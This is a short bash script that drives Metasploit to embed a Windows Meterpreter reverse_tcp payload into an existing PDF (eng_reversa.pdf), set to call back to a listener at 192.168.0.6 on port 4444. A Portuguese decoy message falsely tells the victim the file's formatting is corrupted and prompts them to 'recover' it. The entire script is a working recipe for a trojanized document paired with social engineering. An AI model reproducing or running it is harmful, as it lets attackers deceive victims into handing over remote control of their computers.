#!/bin/bash
msfconsole -x "use exploit/windows/fileformat/adobe_pdf_embedded_exe;
set PAYLOAD windows/meterpreter/reverse_tcp;
set INFILENAME /root/Documents/LIVRARIA_ALEXANDRIA/eng_reversa.pdf;
set LAUCH_MESSAGE A formatação do arquivo pode ter sido corrompida, deseja tentar recuperar o formato original?;
set LHOST 192.168.0.6;
set LPORT 4444;
exploit"
